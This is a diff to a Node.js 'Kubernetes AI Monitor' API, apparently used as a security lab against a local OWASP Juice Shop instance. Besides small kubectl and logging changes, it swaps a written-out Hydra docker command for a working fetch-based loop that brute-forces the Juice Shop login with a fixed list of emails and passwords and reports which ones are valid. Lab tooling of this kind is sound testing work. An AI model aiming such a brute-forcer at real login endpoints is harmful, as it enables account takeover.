@@ -25,19 +25,15 @@ function getKubectlInfo() {
 
         commands.forEach((cmd, index) => {
             exec(cmd, (error, stdout, stderr) => {
-                if (index === 0) results.status = stdout;
-                if (index === 1) results.describe = stdout;
-                if (index === 2) results.logs = stdout;
+                if (index === 0) results.status = stdout || 'No pods found';
+                if (index === 1) results.describe = stdout || 'No pods found';
+                if (index === 2) results.logs = stdout || 'No logs available';
                 
                 if (stderr) results.errors += stderr + '\n';
                 
                 completed++;
                 if (completed === commands.length) {
-                    if (error && !stdout) {
-                        reject({ error: error.message });
-                    } else {
-                        resolve(results);
-                    }
+                    resolve(results);
                 }
             });
         });
@@ -129,9 +125,12 @@ ${clusterInfo.errors}
 
 app.get('/api/status', async (req, res) => {
     try {
+        console.log('Status check requested');
         const clusterInfo = await getKubectlInfo();
+        console.log('Cluster info retrieved:', clusterInfo);
         res.json(clusterInfo);
     } catch (error) {
+        console.error('Status check error:', error);
         res.status(500).json({ error: error.message });
     }
 });
@@ -381,37 +380,39 @@ app.listen(PORT, () => {
     console.log(`Kubernetes AI Monitor API running at http://localhost:${PORT}`);
 });
 
-function runHydraScan() {
-    return new Promise((resolve) => {
-        console.log(`Starting Hydra brute-force test against juice-shop`);
-        
-        // Create wordlists
-        const userList = 'admin@juice-sh.op\nuser@juice-sh.op\ntest@test.com\nadmin@admin.com\nbender@juice-sh.op';
-        const passList = 'admin123\npassword\n123456\nadmin\ntest\njuice\nOwasp123';
-        
-        fs.writeFileSync('users.txt', userList);
-        fs.writeFileSync('passwords.txt', passList);
-        
-        const hydraCmd = `docker run --rm --add-host=host.docker.internal:host-gateway -v "${process.cwd()}:/data" vanhauser/hydra -L /data/users.txt -P /data/passwords.txt host.docker.internal http-post-form "/rest/user/login:email=^USER^&password=^PASS^:S=token" -s 8080 -t 4 -w 10`;
-        
-        exec(hydraCmd, { timeout: 120000 }, (error, stdout, stderr) => {
-            console.log('Hydra stdout:', stdout);
-            console.log('Hydra stderr:', stderr);
-            
-            // Cleanup
+async function runHydraScan() {
+    const users = ['admin@juice-sh.op', 'user@juice-sh.op', 'test@test.com', 'admin@admin.com', 'bender@juice-sh.op'];
+    const passwords = ['admin123', 'password', '123456', 'admin', 'test', 'juice', 'Owasp123'];
+    
+    let output = `Testing ${users.length * passwords.length} combinations...\n`;
+    let found = [];
+    
+    for (const user of users) {
+        for (const pass of passwords) {
             try {
-                fs.unlinkSync('users.txt');
-                fs.unlinkSync('passwords.txt');
-            } catch (e) {}
-            
-            const output = stdout + '\n' + stderr;
-            resolve({
-                success: true,
-                rawOutput: output || 'Hydra scan completed',
-                testedCombinations: 5 * 7 // users * passwords
-            });
-        });
-    });
+                const response = await fetch('http://localhost:8080/rest/user/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: user, password: pass })
+                });
+                
+                if (response.status === 200) {
+                    const data = await response.json();
+                    if (data.authentication?.token) {
+                        found.push({ user, pass });
+                        output += `[SUCCESS] ${user}:${pass}\n`;
+                    }
+                } else {
+                    output += `[FAIL] ${user}:${pass} (${response.status})\n`;
+                }
+            } catch (e) {
+                output += `[ERROR] ${user}:${pass} - ${e.message}\n`;
+            }
+        }
+    }
+    
+    output += `\nCompleted: ${found.length} valid credentials found`;
+    return { success: true, rawOutput: output, testedCombinations: users.length * passwords.length, found };
 }
 
 app.post('/api/hydra-scan', async (req, res) => {
@@ -453,7 +454,7 @@ app.post('/api/hydra-scan', async (req, res) => {
             fs.mkdirSync(reportsDir);
         }
         
-        const reportContent = `# Hydra Brute-Force Analysis\n\n**Target:** juice-shop login\n**Generated:** ${new Date().toLocaleString()}\n**Combinations Tested:** ${hydraResults.testedCombinations || 'N/A'}\n\n## AI Security Analysis\n\n${aiAnalysis}\n\n## Raw Hydra Output\n\n\`\`\`\n${hydraResults.rawOutput}\n\`\`\``;
+        const reportContent = `# Brute-Force Analysis\n\n**Target:** juice-shop login\n**Generated:** ${new Date().toLocaleString()}\n**Combinations Tested:** ${hydraResults.testedCombinations || 'N/A'}\n**Valid Credentials Found:** ${hydraResults.found?.length || 0}\n\n## AI Security Analysis\n\n${aiAnalysis}\n\n## Attack Output\n\n\`\`\`\n${hydraResults.rawOutput}\n\`\`\``;
         
         const filename = `${reportsDir}/hydra-analysis_${timestamp}.md`;
         fs.writeFileSync(filename, reportContent);
